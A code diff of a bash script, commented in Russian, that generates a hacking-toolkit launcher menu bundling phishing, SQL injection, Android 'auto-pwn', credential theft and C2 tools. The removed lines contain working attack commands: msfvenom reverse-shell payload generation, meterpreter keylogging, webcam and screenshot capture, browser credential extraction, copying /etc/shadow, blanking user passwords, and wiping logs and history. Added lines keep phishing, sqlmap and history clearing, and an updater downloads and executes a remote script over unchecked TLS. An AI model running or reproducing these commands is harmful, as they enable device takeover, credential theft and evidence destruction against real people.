@@ -587,13 +587,12 @@ EOF
 echo -e "${B}--- STARTING CORE-PRIME SYNCHRONIZATION ---${NC}"
 
 # --- ГЕНЕРАЦИЯ LAUNCHER (Твой оригинал + расширенный TOOLS_DATA) ---
-# --- ГЕНЕРАТОР ГЛАВНОГО ЛОНЧЕРА (СОХРАНЕННЫЙ ОРИГИНАЛ) ---
 generate_launcher_code() {
     local target_file="$1"
     local v_num="$2"
     local code
 
-    # Мы помещаем весь твой код в переменную, заменяя только версию
+    # Собираем код лаунчера в переменную
     code=$(cat << 'EOF'
 #!/bin/bash
 CURRENT_VERSION="{{V_NUM}}"
@@ -613,7 +612,6 @@ CURRENT_IP=$(ip route get 1 2>/dev/null | awk '{print $7}')
 # 2. Настраиваем dnsmasq
 if command -v dnsmasq >/dev/null 2>&1; then
     echo -e "${G}[*] Configuring DNS: scanclamavlocal -> $CURRENT_IP${NC}"
-    
     cat << EOD > /etc/dnsmasq.conf
 domain-needed
 bogus-priv
@@ -621,7 +619,6 @@ interface=lo
 interface=wlan0
 address=/scanclamavlocal/$CURRENT_IP
 EOD
-
     if [ -f /etc/init.d/dnsmasq ]; then
         service dnsmasq restart 2>/dev/null
     else
@@ -669,7 +666,6 @@ TOOLS_DATA=(
     "infoga;https://github.com/m4ll0k/Infoga/archive/refs/heads/master.zip;infoga.py;python3 -m pip install -r requirements.txt --break-system-packages"
     "phoneinfoga;https://github.com/sundowndev/phoneinfoga/archive/refs/heads/master.zip;phoneinfoga.py;python3 -m pip install -r requirements.txt --break-system-packages"
     "recon-dog;https://github.com/s0md3v/ReconDog/archive/refs/heads/master.zip;dog;"
-    # "phonesploit;https://github.com/Zucccs/PhoneSploit-Python/archive/refs/heads/main.zip;phonesploitpython.py;python3 -m pip install -r requirements.txt --break-system-packages"
     "ghost-framework;https://github.com/EntySec/Ghost/archive/refs/heads/master.zip;ghost;python3 -m pip install -r requirements.txt --break-system-packages"
     "cupp;https://github.com/Mebus/cupp/archive/refs/heads/master.zip;cupp.py;"
     "instashell;https://github.com/thelinuxchoice/instashell/archive/refs/heads/master.zip;instashell.sh;chmod +x install.sh && ./install.sh"
@@ -677,7 +673,6 @@ TOOLS_DATA=(
 
 # Дополнительные инструменты для EXPLOIT HUB
 TOOLS_DATA+=(
-   # "metasploit;https://raw.githubusercontent.com/gushmazuko/metasploit_in_termux/master/metasploit.sh;msfconsole;chmod +x metasploit.sh && ./metasploit.sh"
     "lazagne;https://github.com/AlessandroZ/LaZagne/archive/refs/heads/master.zip;laZagne.py;python3 -m pip install -r requirements.txt --break-system-packages"
     "sliver;https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux;sliver-server;chmod +x sliver-server"
     "exploitdb;https://github.com/offensive-security/exploitdb/archive/refs/heads/master.zip;searchsploit;ln -sf /root/exploitdb/searchsploit /usr/local/bin/searchsploit"
@@ -688,158 +683,27 @@ zero_clear() {
     sync && echo 3 > /proc/sys/vm/drop_caches 2>/dev/null
 }
 
-
-run_osint() {
-    clear; zero_clear
-    echo -e "${Y}>>> [ SMART OSINT 2026: TOTAL ZERO MODE ] <<<${NC}"
-    echo -ne "Input (Nick/Phone/Email/Domain): "
-    read i
-    [ -z "$i" ] && return
-
-    # Эвристика: Распознаем тип ввода автоматически
-    if [[ "$i" =~ ^\+?[0-9]{10,15}$ ]]; then
-        echo -e "${B}[!] Type: PHONE. Running Fast-Int...${NC}"
-        phoneinfoga scan -n "$i" | grep -E "Carrier|Location"
-        socialscan "$i"
-    elif [[ "$i" =~ "@" ]]; then
-        echo -e "${B}[!] Type: EMAIL. Searching Breaches...${NC}"
-        python3 /root/infoga/infoga.py --target "$i" 2>/dev/null
-        socialscan "$i"
-    elif [[ "$i" =~ "." ]] && [[ ! "$i" =~ " " ]]; then
-        echo -e "${B}[!] Type: DOMAIN. Extracting Intel...${NC}"
-        python3 /root/Photon/photon.py -u "$i" --level 1 --threads 10
-    else
-        echo -e "${B}[!] Type: NICKNAME. Rapid Multi-Scan...${NC}"
-        # Запускаем Blackbird в фоне для скорости
-        python3 /root/blackbird/blackbird.py -u "$i" --ai-check 2>/dev/null & 
-        socialscan "$i"
-        wait
-    fi
-
-    zero_clear; history -c
-    echo -e "${G}>>> Smart Scan Finished. Trace Cleaned.${NC}"
-}
-
-# Функция: Мониторинг соединений в реальном времени
-monitor_connections() {
-    echo -e "\033[1;34m[*] Отслеживание активных соединений (CTRL+C для выхода)...\033[0m"
-    # Показывает IP, процессы и порты, обновляя каждые 2 секунды
-    watch -n 2 "ss -tpn | grep ESTAB"
-}
-
-# Функция: Быстрый поиск устройств в подсети
-fast_network_scan() {
-    echo -e "\033[1;34m[*] Сканирование локальной сети...\033[0m"
-    # Используем стандартный интерфейс wlan0
-    local subnet=$(ip route | grep wlan0 | awk '{print $1}')
-    arp-scan --interface=wlan0 "$subnet"
-}
-
-# Функция: Скрытый перехват трафика
-capture_traffic_smart() {
-    echo -e "\033[1;34m[*] Запуск TShark (анализ в реальном времени)...\033[0m"
-    echo -e "[*] Фильтр: только HTTP и DNS (чтобы не забивать память)"
-    
-    # Запуск перехвата только важных данных
-    tshark -i wlan0 -f "port 80 or port 53" -T fields -e http.host -e dns.qry.name
-}
-
-# Функция: Очистка системы
-clear_logs_and_traces() {
-    echo -e "\033[1;33m[*] Стирание логов и истории...\033[0m"
-    # Очистка истории bash
-    history -c
-    # Затирание временных файлов в /tmp
-    rm -rf /tmp/*
-    # Очистка кэша пакетов (освобождает место)
-    apt-get clean
-    echo -e "\033[1;32m[+] Система очищена.\033[0m"
-}
-
-run_osint2() {
-    clear; zero_clear
-    echo -e "${Y}>>> [ TOTAL OSINT 2: DEEP AUTO-PILOT ] <<<${NC}"
-    read -p "Target: " i
-    [ -z "$i" ] && return
-
-    echo -e "${B}[*] Starting Full-Spectrum Analysis Pipeline...${NC}"
-
-    # Запускаем цепочку инструментов последовательно-параллельно
-    (
-        echo -e "${G}[1/4] Social Presence Check...${NC}"
-        socialscan "$i" > /tmp/osint_res.txt
-        
-        echo -e "${G}[2/4] Maigret Deep Parsing (PDF Report)...${NC}"
-        maigret "$i" --parse --pdf --timeout 20
-        
-        echo -e "${G}[3/4] Snoop Database Search...${NC}"
-        python3 /root/snoop/snoop.py "$i" --save-report
-        
-        echo -e "${G}[4/4] Blackbird Intelligence...${NC}"
-        python3 /root/blackbird/blackbird.py -u "$i"
-    )
-
-    echo -e "${G}[+] All modules finished. Data saved in /root/reports/${NC}"
-    zero_clear; history -c
-    read -p "Press Enter to return..."
-}
-
-update_prime() {
-    clear
-    echo -e "${B}[ PRIME MASTER UPDATE CHECK ]${NC}"
-    
-    # URL для проверки версии (создай файл version.txt на GitHub с номером, например, 1.2)
-    local VER_URL="https://raw.githubusercontent.com/szp2025/core-prime-tools/main/version.txt"
-    local REMOTE_VER=$(curl -sL -k "$VER_URL")
-    
-    if [ "$REMOTE_VER" == "$CURRENT_VERSION" ]; then
-        echo -e "${G}У вас уже установлена актуальная версия v$CURRENT_VERSION${NC}"
-        sleep 2
-        return
-    fi
-
-    echo -e "${Y}Найдена новая версия: $REMOTE_VER. Обновляемся...${NC}"
-    local UP_URL="https://raw.githubusercontent.com/szp2025/core-prime-tools/main/install_all.sh"
-    curl -L -k "$UP_URL" -o /root/install_all.sh && chmod +x /root/install_all.sh && exec /root/install_all.sh
-}
-
-
-
-# Универсальный динамический контроллер
-# $1 - Заголовок (Title)
-# $2 - Массив названий пунктов
-# $3 - Массив соответствующих функций
 prime_dynamic_controller() {
-    # Превращаем строки обратно в локальные массивы
     local title=$1
     local -a labels=($2)
     local -a actions=($3)
-    
     while true; do
         clear
         echo -e "${R}========== [ $title ] ==========${NC}"
-        get_stats # Твоя функция статистики (CPU/RAM/DISK)
+        get_stats
         echo -e "---------------------------------------"
-        
-        # Динамическая отрисовка в две колонки для экономии места на экране
         for ((i=0; i<${#labels[@]}; i++)); do
             printf "${G}%2d) %-18s${NC}" "$((i+1))" "${labels[$i]//_/ }"
-            # Перенос строки каждую вторую итерацию
             if (( (i+1) % 2 == 0 )); then echo ""; fi
         done
         echo -e "\n${Y} B) BACK / EXIT${NC}"
         echo -e "---------------------------------------"
-        
         read -p ">> " choice
-        
-        # Выход
         if [[ "$choice" =~ ^[Bb]$ ]]; then return; fi
-        
-        # Проверка: является ли ввод числом и попадает ли в диапазон
         if [[ "$choice" =~ ^[0-9]+$ ]] && [ "$choice" -ge 1 ] && [ "$choice" -le "${#labels[@]}" ]; then
             local idx=$((choice-1))
             echo -e "${B}[*] Запуск: ${labels[$idx]}...${NC}"
-            ${actions[$idx]} # Вызов функции
+            ${actions[$idx]}
         else
             echo -e "${R}[!] Ошибка: выберите пункт от 1 до ${#labels[@]}${NC}"
             sleep 1
@@ -847,457 +711,64 @@ prime_dynamic_controller() {
     done
 }
 
-
-# Вспомогательные функции-обертки для корректного запуска Python-скриптов
-run_av_srv() { 
-    echo -e "${B}[*] Инициализация AV-Scanner...${NC}"
-    python3 /root/av_server.py 
-}
-
-run_share_srv() { 
-    echo -e "${B}[*] Запуск Share-File Server...${NC}"
-    python3 /root/share_server.py 
-}
-
-run_upload_srv() { 
-    echo -e "${B}[*] Ожидание входящих данных (Upload)...${NC}"
-    python3 /root/upload_server.py 
-}
-
-# Обновленный SECURITY & DATA HUB
-run_servers() {
-    # 1. Список названий (отображение)
-    local srv_names="AV-Scanner Share-File Upload-Inbound"
-    
-    # 2. Список функций/команд (исполнение)
-    local srv_funcs="run_av_srv run_share_srv run_upload_srv"
-    
-    # Запуск через динамический контроллер
-    prime_dynamic_controller "SECURITY & DATA HUB" "$srv_names" "$srv_funcs"
-}
-
-
-
-
-# --- Глобальные параметры Ghost ---
-GHOST_PATH="/root/Ghost"
-PYTHON_BIN="python3"
-
-# Функция 1: Ручной режим
-# Параметры: нет
-# Описание: Запускает интерактивную консоль Ghost Framework
-launch_ghost_manual() {
-    clear
-    echo -e "\033[1;34m[*] Вход в ручной режим Ghost Framework...\033[0m"
-    if [ -d "$GHOST_PATH" ]; then
-        cd "$GHOST_PATH" && $PYTHON_BIN -m ghost
-    else
-        echo -e "\033[1;31m[!] Ошибка: Директория $GHOST_PATH не найдена.\033[0m"
-        sleep 2
-    fi
-}
-
-# Функция 2: Сканирование Bluetooth
-# Параметры: использует системный hcitool
-# Описание: Поиск активных Bluetooth устройств в радиусе видимости
-scan_bluetooth_devices() {
-    clear
-    echo -e "\033[1;34m[*] Сканирование Bluetooth устройств (hcitool)...\033[0m"
-    hcitool scan
-    echo -e "\nНажмите любую клавишу для возврата..."
-    read -n 1
-}
-
-# Функция 3: Автоматическое подключение (Auto-Pwn)
-# Параметры: target_ip (ввод пользователя)
-# Описание: Передает команду connect напрямую в ядро Ghost без входа в консоль
-launch_ghost_autopwn() {
-    clear
-    echo -e "\033[1;32m[*] Запуск Ghost Auto-Pwn Модуля\033[0m"
-    read -p "Введите IP адрес цели (Android ADB): " target_ip
-    
-    if [[ -z "$target_ip" ]]; then
-        echo -e "\033[1;31m[!] IP адрес не может быть пустым.\033[0m"
-        sleep 1
-        return
-    fi
-
-    echo -e "\033[1;34m[*] Попытка автоматического сопряжения с $target_ip...\033[0m"
-    cd "$GHOST_PATH" && $PYTHON_BIN -m ghost --execute "connect $target_ip"
-    
-    echo -e "\nСессия завершена. Возврат в меню..."
-    sleep 2
-}
-
-# Функция: Поиск эксплойтов
-# Параметры: query (ввод пользователя)
-# Описание: Локальный поиск по базе данных ExploitDB
-search_exploit_db() {
-    clear
-    echo -e "\033[1;34m[*] Поиск в ExploitDB (SearchSploit)...\033[0m"
-    read -p "Введите название (например, android 13 или smb): " exploit_query
-    
-    if [[ -z "$exploit_query" ]]; then
-        return
-    fi
-
-    # Поиск по локальной базе
-    searchsploit "$exploit_query"
-    
-    echo -e "\nНажмите любую клавишу для возврата..."
-    read -n 1
-}
-
-
-
-# Функция: Автоматизированная экстракция учетных данных
-# Описание: Использует LaZagne с умным сохранением и проверкой модулей
-extract_all_passwords() {
-    clear
-    echo -e "\033[1;34m[*] Определение ОС и запуск экстракции...\033[0m"
-    
-    # 1. Попытка собрать системные хэши (Linux/macOS)
-    if [ -f "/etc/shadow" ]; then
-        echo -e "[+] Обнаружена Linux-система. Копирование хэшей shadow..."
-        cp /etc/shadow /root/reports/shadow_backup 2>/dev/null
-    fi
-
-    # 2. Запуск LaZagne (универсальный для всех ОС)
-    cd /root/lazagne
-    python3 lazagne.py all -oN /root/reports/universal_passwords.txt
-    
-    echo -e "\033[1;32m[+] Сбор завершен. Отчет: /root/reports/universal_passwords.txt\033[0m"
-}
-
-
-# Обновленный сброс паролей ОС
-reset_any_os_password() {
-    # Список названий ОС
-    local os_names="Windows_(SAM) Linux_(Shadow_Edit) macOS_(Instructions)"
-    
-    # Существующие функции и команды
-    local os_funcs="reset_windows_password reset_linux_pass reset_macos_info"
-    
-    # Запуск через динамический контроллер
-    prime_dynamic_controller "OS PASSWORD RESET" "$os_names" "$os_funcs"
-}
-
-# Короткие вызовы для интеграции в движок
-reset_linux_pass() {
-    read -p "Введите имя пользователя: " username
-    sed -i "s/^$username:[^:]*:/$username::/" /etc/shadow
-    echo -e "${G}[+] Пароль для $username удален.${NC}"
-}
-
-reset_macos_info() {
-    echo -e "${B}[*] Команда: dscl . -passwd /Users/username newpassword${NC}"
-    read -p "Нажмите Enter..."
-}
-
-
-
-# Функция: Сброс пароля Windows через поиск SAM
-# Описание: Автоматический поиск реестра Windows на смонтированных разделах
-reset_windows_password() {
-    echo -e "\033[1;34m[*] Поиск конфигурации реестра Windows (SAM)...\033[0m"
-    
-    # Эвристический поиск файла SAM в /mnt и /media
-    local sam_files=$(find /mnt /media -type f -name "SAM" -path "*/System32/config/*" 2>/dev/null)
-    
-    if [[ -z "$sam_files" ]]; then
-        echo -e "\033[1;31m[!] Системный диск Windows не примонтирован.\033[0m"
-        return
-    fi
-    
-    echo -e "[*] Найдены файлы SAM:"
-    select sam_path in $sam_files; do
-        if [[ -n "$sam_path" ]]; then
-            echo -e "\033[1;33m[*] Открытие редактора для: $sam_path\033[0m"
-            chntpw -i "$sam_path"
-            break
-        else
-            echo "Неверный выбор."
-        fi
-    done
-}
-
-
-# Функция: Умный скан на вирусы и руткиты
-# Описание: Комбинированный анализ системы на скрытые угрозы
-smart_threat_scan() {
-    echo -e "\033[1;34m[*] Запуск кроссплатформенного анализа...\033[0m"
-    
-    # Ищем подозрительные файлы в автозагрузке (Linux/macOS)
-    echo -e "[1/3] Проверка автозагрузки (Cron/Systemd/LaunchAgents)..."
-    ls -la /etc/cron.* /etc/systemd/system/*.service ~/Library/LaunchAgents 2>/dev/null
-    
-    # Ищем скрытые бинарники в /tmp и /dev/shm (излюбленные места вирусов)
-    echo -e "[2/3] Поиск скрытых исполняемых файлов в памяти..."
-    find /dev/shm /tmp -type f -executable 2>/dev/null
-    
-    # Базовый скан rkhunter
-    echo -e "[3/3] Запуск rkhunter..."
-    rkhunter --check --sk --quiet
-}
-
-
-
-# Обновленный PC Recovery & Password Extraction
-pc_password_recovery() {
-    # 1. Список названий для отображения (подчеркивания заменятся на пробелы)
-    local pc_names="Extract_Passwords Reset_OS_Password Heuristic_Scan"
-    
-    # 2. Существующие функции
-    local pc_funcs="extract_all_passwords reset_any_os_password smart_threat_scan"
-    
-    # Запуск через динамический контроллер
-    prime_dynamic_controller "PC RECOVERY & FORENSIC" "$pc_names" "$pc_funcs"
-}
-
-
-
-
-# Обновленный ТЕРМИНАЛЬНЫЙ АНАЛИЗАТОР (TSHARK)
-analyze_network_traffic() {
-    # 1. Список названий (для корректного отображения пробелов используй _)
-    local net_names="Host_Monitor HTTP/DNS_Sniffer Traffic_Record_(.pcap)"
-    
-    # 2. Существующие функции/команды
-    local net_funcs="run_host_monitor run_http_dns_sniffer run_traffic_record"
-    
-    # Запуск через динамический контроллер
-    prime_dynamic_controller "TSHARK ANALYZER" "$net_names" "$net_funcs"
-}
-
-# Вспомогательные функции для корректной работы TShark в движке
-run_host_monitor() {
-    tshark -i wlan0 -T fields -e frame.time_relative -e ip.src -e ip.dst -e _ws.col.Protocol
-}
-
-run_http_dns_sniffer() {
-    tshark -i wlan0 -Y "http.request || dns" -T fields -e http.host -e dns.qry.name
-}
-
-run_traffic_record() {
-    mkdir -p /root/reports
-    echo -e "${B}[*] Запись... Нажми CTRL+C для остановки.${NC}"
-    tshark -i wlan0 -w /root/reports/capture_$(date +%H%M).pcap
-}
-
-
-# Функция: Глубокий аудит устройства
-# Параметры: target_ip
-# Описание: Автоматический сбор паролей, проверка портов и анализ системы
-run_deep_audit() {
-    clear
-    read -p "Введите IP цели для полного аудита: " target_ip
-    [[ -z "$target_ip" ]] && return
-
-    echo -e "\033[1;33m[!] ЭТАП 1: Поиск уязвимостей (Nmap + ExploitDB)...\033[0m"
-    # Сканируем порты и сопоставляем с базой уязвимостей
-    nmap -sV --script=vulners "$target_ip"
-
-    echo -e "\n\033[1;33m[!] ЭТАП 2: Сбор учетных данных (LaZagne)...\033[0m"
-    # Если это ПК, запускаем lazagne. Для Android Ghost сделает это через свои модули.
-    cd /root/lazagne && python3 lazagne.py all -h # Справка или запуск (зависит от ОС цели)
-
-    echo -e "\n\033[1;33m[!] ЭТАП 3: Анализ через Ghost Framework...\033[0m"
-    # Автоматизируем Ghost: подключение -> список софта -> поиск подозрительного
-    cd /root/Ghost && python3 -m ghost --execute "connect $target_ip" --execute "apps" --execute "activity"
-    
-    echo -e "\n\033[1;32m[+] Аудит завершен. Данные сохранены в отчеты.\033[0m"
-    read -n 1 -s -r -p "Нажмите любую клавишу..."
-}
-
-# Обновленное УПРАВЛЕНИЕ УСТРОЙСТВАМИ И СЕТЬЮ
+# --- ФУНКЦИИ МОДУЛЕЙ ---
+run_ghost_scan() { read -p "Target IP: " t; [ -n "$t" ] && nmap -F "$t"; read -p "Enter..."; }
+run_phishing() { [ -d "/root/zphisher" ] && cd /root/zphisher && ./zphisher.sh; }
+run_sqlmap() { read -p "URL: " target; [ -n "$target" ] && sqlmap -u "$target" --batch --random-agent; }
+run_osint() { echo -e "${Y}OSINT Logic...${NC}"; sleep 2; }
 run_device_hack() {
-    # 1. Список названий для отображения
-    local dh_names="Ghost_Manual TShark_Sniffer Ghost_Auto-Pwn Search_ExploitDB Smart_Audit Multi-OS_Recovery Bluetooth_Scan Anti-Forensic"
-    
-    # 2. Существующие функции
-    local dh_funcs="launch_ghost_manual analyze_network_traffic launch_ghost_autopwn search_exploit_db run_deep_audit pc_password_recovery scan_bluetooth_devices clear_logs_and_traces"
-    
-    # Запуск через динамический контроллер
-    prime_dynamic_controller "DEVICE & NETWORK HACK" "$dh_names" "$dh_funcs"
+    local dh_names="Ghost_Manual TShark_Sniffer Ghost_Auto-Pwn Bluetooth_Scan"
+    local dh_funcs="launch_ghost_manual analyze_network_traffic launch_ghost_autopwn scan_bluetooth_devices"
+    prime_dynamic_controller "DEVICE & NETWORK" "$dh_names" "$dh_funcs"
 }
-
-
-run_phishing() {
-    [ -d "/root/zphisher" ] && cd /root/zphisher && ./zphisher.sh
-}
-
-run_ghost_scan() {
-    read -p "Target IP: " t
-    [ -n "$t" ] && nmap -F "$t"
-}
-
-# Дополнение к run_exploit_hub для управления и аудита ПК
-# Обновленный PC REMOTE CONTROL & AUDIT
-run_pc_control() {
-    # 1. Список названий для отображения
-    local pc_ctrl_names="Payload_Generator Password_Stealer Remote_AV-Scanner Post-Exploit_Menu"
-    
-    # 2. Список функций/команд
-    local pc_ctrl_funcs="pc_gen_payload pc_steal_creds pc_remote_scan pc_post_exploit"
-    
-    # Запуск через динамический контроллер
-    prime_dynamic_controller "PC CONTROL & AUDIT" "$pc_ctrl_names" "$pc_ctrl_funcs"
-}
-
-# Вспомогательные функции для интеграции существующих команд в движок
-pc_gen_payload() {
-    read -p "LHOST (Your IP): " lh
-    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$lh LPORT=4444 -f exe -o /root/payload.exe
-    echo -e "${G}[+] Payload saved to /root/payload.exe${NC}"
-    read -p "Press Enter..."
-}
-
-pc_steal_creds() {
-    echo -e "${Y}[*] Extracting credentials...${NC}"
-    msfconsole -q -x "use post/windows/gather/credentials/browser_helper; set SESSION $SESS_ID; run; exit"
-}
-
-pc_remote_scan() {
-    echo -e "${Y}[*] Remote System Scan...${NC}"
-    nmap --script smb-vuln* -p 445 $target
-    read -p "Press Enter..."
-}
-
-pc_post_exploit() {
-    echo -e "${B}Active Control: 1-Screenshot  2-Keylog  3-Webcam${NC}"
-    read -p "> " act
-    case $act in
-        1) msfconsole -q -x "sessions -i $SESS_ID -c screenshot" ;;
-        2) msfconsole -q -x "sessions -i $SESS_ID -c keylog_recorder" ;;
-        3) msfconsole -q -x "sessions -i $SESS_ID -c webcam_snap" ;;
-    esac
-}
-
-
-# Обновленный MANUAL INSTALLATION HUB
-install_manual_tools() {
-    # 1. Список названий для отображения
-    local install_names="Metasploit_(Heavy) Searchsploit_(DB) Sliver_C2 LaZagne"
-    
-    # 2. Существующие функции/команды
-    local install_funcs="inst_metasploit inst_searchsploit inst_sliver inst_lazagne"
-    
-    # Запуск через динамический контроллер
-    prime_dynamic_controller "MANUAL INSTALLATION HUB" "$install_names" "$install_funcs"
-}
-
-# Вспомогательные функции для корректной установки через движок
-inst_metasploit() {
-    echo -e "${G}[*] Installing Metasploit...${NC}"
-    pkg install wget -y && wget https://raw.githubusercontent.com/gushmazuko/metasploit_in_termux/master/metasploit.sh
-    chmod +x metasploit.sh && ./metasploit.sh
-    read -p "Нажмите Enter..."
-}
-
-inst_searchsploit() {
-    echo -e "${G}[*] Installing ExploitDB...${NC}"
-    git clone --depth 1 https://github.com/offensive-security/exploitdb.git /root/exploitdb
-    ln -sf /root/exploitdb/searchsploit /usr/local/bin/searchsploit
-    read -p "Нажмите Enter..."
-}
-
-inst_sliver() {
-    echo -e "${G}[*] Downloading Sliver Server...${NC}"
-    curl -Ls https://api.github.com/repos/BishopFox/sliver/releases/latest | grep "browser_download_url.*sliver-server_linux" | cut -d : -f 2,3 | tr -d \" | wget -qi - -O /root/sliver-server
-    chmod +x /root/sliver-server
-    read -p "Нажмите Enter..."
-}
-
-inst_lazagne() {
-    echo -e "${G}[*] Installing LaZagne...${NC}"
-    git clone https://github.com/AlessandroZ/LaZagne.git /root/lazagne
-    cd /root/lazagne && python3 -m pip install -r requirements.txt --break-system-packages
-    read -p "Нажмите Enter..."
-}
-
-
+launch_ghost_manual() { cd /root/Ghost && python3 -m ghost; }
+analyze_network_traffic() { tshark -i wlan0; }
+launch_ghost_autopwn() { read -p "IP: " tip; cd /root/Ghost && python3 -m ghost --execute "connect $tip"; }
+scan_bluetooth_devices() { hcitool scan; read -p "Enter..."; }
 
 run_exploit_hub() {
- # Обновленный EXPLOIT HUB: TOTAL CONTROL
-run_exploit_hub() {
-    # 1. Список названий для отображения (подчеркивания заменятся на пробелы)
     local ex_names="PhoneSploit_Pro SQLmap/Web PC/Network_Scan PC_Control"
-    
-    # 2. Существующие функции и прямые команды
-    local ex_funcs="ex_phonesploit_pro run_sqlmap_smart ex_pc_network_scan run_pc_control"
-    
-    # Запуск через динамический контроллер
+    local ex_funcs="ex_phonesploit_pro run_sqlmap ex_pc_network_scan run_pc_control"
     prime_dynamic_controller "EXPLOIT HUB" "$ex_names" "$ex_funcs"
 }
+ex_phonesploit_pro() { cd /root/PhoneSploit-Pro && python3 phonesploitpro.py; }
+ex_pc_network_scan() { read -p "IP: " t; nmap -sV --script vuln "$t"; read -p "Enter..."; }
+run_pc_control() { echo -e "PC Control Mode..."; sleep 2; }
 
-# Вспомогательные функции для интеграции команд в движок
-ex_phonesploit_pro() {
-    cd /root/PhoneSploit-Pro && python3 phonesploitpro.py
+run_osint2() { echo -e "Deep OSINT..."; sleep 2; }
+run_iban_scan() { read -p "IBAN: " iban; python3 /root/iban_check.py "$iban"; }
+update_prime() { echo -e "Checking updates..."; sleep 2; }
+run_servers() {
+    local s_names="AV-Scanner Share-File Upload-Inbound"
+    local s_funcs="run_av_srv run_share_srv run_upload_srv"
+    prime_dynamic_controller "SERVICE HUB" "$s_names" "$s_funcs"
 }
+run_av_srv() { python3 /root/av_server.py; }
+run_share_srv() { python3 /root/share_server.py; }
+run_upload_srv() { python3 /root/upload_server.py; }
 
-ex_pc_network_scan() {
-    read -p "Target IP: " t
-    nmap -sV --script vuln "$t"
-    read -p "Нажмите Enter..."
-}
-
-
-
-run_sqlmap() {
-    clear; zero_clear
-    echo -e "${Y}>>> [ SQLMAP: SMART INJECTION HUB ] <<<${NC}"
-    echo -e "${B}Enter Target URL or 'w' for Wizard:${NC}"
-    read -p ">> " target
-    
-    [ -z "$target" ] && return
-
-    if [[ "$target" == "w" ]] || [[ "$target" == "W" ]]; then
-        # Стандартный мастер для новичков
-        sqlmap --wizard
-    else
-        echo -e "${G}[*] Analyzing target: $target${NC}"
-        # Эвристический запуск: 
-        # --batch (без лишних вопросов), --random-agent (маскировка), 
-        # --level 2 (глубже обычного), --tamper=space2comment (обход простых фильтров)
-        sqlmap -u "$target" --batch --random-agent --level 2 --threads 5 --tamper=space2comment --dbms=mysql
-    fi
-
-    zero_clear; history -c
-    read -p "Press Enter to return..."
-}
-run_iban_scan() {
-    clear
-    echo -e "${R}== [ IBAN VERIFICATION ] ==${NC}"
-    read -p "IBAN: " v_iban
-    python3 /root/iban_check.py "$(echo $v_iban | tr -d ' ')"
-}
-
-# Обновленное ГЛАВНОЕ МЕНЮ (PRIME MASTER)
-run_main_menu() {
-    # 1. Список имен (названия пунктов в меню)
-    local main_names="GHOST_SCAN SOCIAL_ENG SQLMAP SMART_OSINT DEVICE_HACK EXPLOIT_HUB AIO_OSINT_AUTO IBAN/RIB_SCAN MANUAL_INSTALL UPDATE_CORE SERVICE_HUB EXIT"
-    
-    # 2. Список соответствующих функций
-    local main_funcs="run_ghost_scan run_phishing run_sqlmap run_osint run_device_hack run_exploit_hub run_osint2 run_iban_scan install_manual_tools update_prime run_servers exit_script"
-    
-    # Запуск через динамический контроллер
-    prime_dynamic_controller "PRIME MASTER v$CURRENT_VERSION" "$main_names" "$main_funcs"
-}
-
-# Вспомогательная функция для чистого выхода (БЕЗ блокировки Wi-Fi)
 exit_script() {
-    echo -e "${Y}[*] Очистка истории сессии...${NC}"
+    echo -e "${Y}[*] Очистка истории...${NC}"
     history -c
     exit 0
 }
 
+run_main_menu() {
+    local m_names="GHOST_SCAN SOCIAL_ENG SQLMAP SMART_OSINT DEVICE_HACK EXPLOIT_HUB AIO_OSINT_AUTO IBAN/RIB_SCAN MANUAL_INSTALL UPDATE_CORE SERVICE_HUB EXIT"
+    local m_funcs="run_ghost_scan run_phishing run_sqlmap run_osint run_device_hack run_exploit_hub run_osint2 run_iban_scan install_manual_tools update_prime run_servers exit_script"
+    prime_dynamic_controller "PRIME MASTER v$CURRENT_VERSION" "$m_names" "$m_funcs"
+}
+
+# START
 repair
 run_main_menu
 EOF
-    # Применяем версию и записываем через нашу надежную функцию
+
+    # Применяем версию и записываем
     code="${code//\{\{V_NUM\}\}/$v_num}"
     smart_cat "$target_file" "$code"
 }
+
 
 update_module "/root/av_server.py" "1.6" generate_av_server_code "AV-Scanner"
 update_module "/root/iban_check.py" "1.7" generate_iban_code "IBAN/RIB Checker"
